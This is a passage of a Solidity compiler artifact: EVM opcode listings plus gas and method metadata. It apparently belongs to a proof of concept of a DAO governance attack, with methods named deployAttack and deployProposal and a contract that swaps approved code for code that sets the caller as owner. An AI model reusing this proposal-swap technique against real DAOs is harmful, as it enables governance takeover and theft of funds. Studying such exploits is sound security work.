MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x373058B8 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0xDA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5A SWAP2 SWAP1 PUSH2 0x13F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x90 SWAP1 PUSH2 0x1DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x129 DUP3 PUSH2 0xFE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x139 DUP2 PUSH2 0x11E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x154 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x130 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x457865637574656420636F6465206E6F7420617070726F766564206279204441 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x4F203A2900000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C7 PUSH1 0x24 DUP4 PUSH2 0x15A JUMP JUMPDEST SWAP2 POP PUSH2 0x1D2 DUP3 PUSH2 0x16B JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1F6 DUP2 PUSH2 0x1BA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4E CALLDATASIZE PUSH15 0xA91CAC84ACA13E4D17EEB135CBA7F2 SWAP16 PC JUMPDEST 0x2D 0xCD CALLDATACOPY DUP6 CALLVALUE 0xAF EXP 0xAA GAS 0xAB DELEGATECALL PUSH5 0x736F6C6343 STOP ADDMOD SLT STOP CALLER PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x153 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x373058B8 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x63A599A4 EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x4F JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x86 JUMP JUMPDEST STOP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x7C SWAP1 PUSH2 0xFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x457865637574656420636F646520617070726F7665642062792044414F000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE7 PUSH1 0x1D DUP4 PUSH2 0xA0 JUMP JUMPDEST SWAP2 POP PUSH2 0xF2 DUP3 PUSH2 0xB1 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x116 DUP2 PUSH2 0xDA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP5 DUP12 0xD9 0xDD CALL SMOD DUP8 MULMOD 0xCA MSIZE 0xB4 0x26 SWAP9 0xDB 0xE7 CALLER MUL 0xB0 DELEGATECALL PUSH31 0xC794281E6C145C0B7E36A6E664736F6C63430008120033A264697066735822 SLT KECCAK256 SWAP2 DUP5 0xCF 0xDF SWAP4 MLOAD EXP SHR PUSH30 0x6A5FC09199B659CFF7463E617423737CF978379515F71664736F6C634300 ADDMOD SLT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "302600",
						"executionCost": "343",
						"totalCost": "302943"
					},
					"external": {
						"deployAttack(uint256)": "infinite",
						"deployProposal(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"deployAttack(uint256)": "35bd2d43",
					"deployProposal(uint256)": "481508df"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}